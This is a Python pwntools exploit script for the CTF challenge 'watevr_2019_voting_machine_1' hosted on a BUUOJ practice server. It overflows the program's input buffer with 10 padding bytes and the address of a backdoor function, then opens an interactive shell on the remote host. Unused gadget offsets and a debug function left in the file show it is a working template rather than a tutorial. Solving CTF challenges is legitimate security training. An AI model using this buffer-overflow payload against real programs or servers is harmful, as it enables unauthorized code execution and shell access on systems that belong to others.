#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/31 03:31:29
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./watevr_2019_voting_machine_1"
menu = ""
if context.arch == "amd64":
    # libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    # one_offset = [0x4f3d5,0x4f432,0x10a41c]
    libc_path = "../../libc/libc-2.27.so"
    one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    # libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
elf = ELF(file_name)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 26071
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))
pop_rdi = 0x00000000004009b3
backdoor = 0x400807
payload = 'a' * 10 + p64(backdoor) 
sh.sendline(payload)
sh.interactive()